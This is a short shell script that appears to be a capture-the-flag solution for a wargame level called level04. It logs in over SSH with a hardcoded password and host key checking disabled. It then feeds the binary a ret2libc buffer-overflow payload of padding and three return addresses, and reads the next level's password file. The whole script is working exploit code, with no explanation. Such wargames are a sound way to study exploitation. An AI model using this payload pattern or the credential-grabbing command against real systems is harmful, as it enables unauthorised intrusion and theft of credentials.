#!/bin/sh
PASS='kgv3tkEb9h2mLkRsPkXRfc2mHbjMxQzvb2FrgKkf'
echo $PASS
echo $OVERRIDE

sshpass -p $PASS ssh -o StrictHostKeyChecking=no level04@$OVERRIDE -p 4242 << EOF
SHELL=/bin/sh
(python -c "print 'A'*156 + '\xd0\xae\xe6\xf7' +  '\x70\xeb\x5e\xf7' + '\xec\x97\xf8\xf7'"; echo cat /home/users/level05/.pass; pkill -9 level04) | ./level04
EOF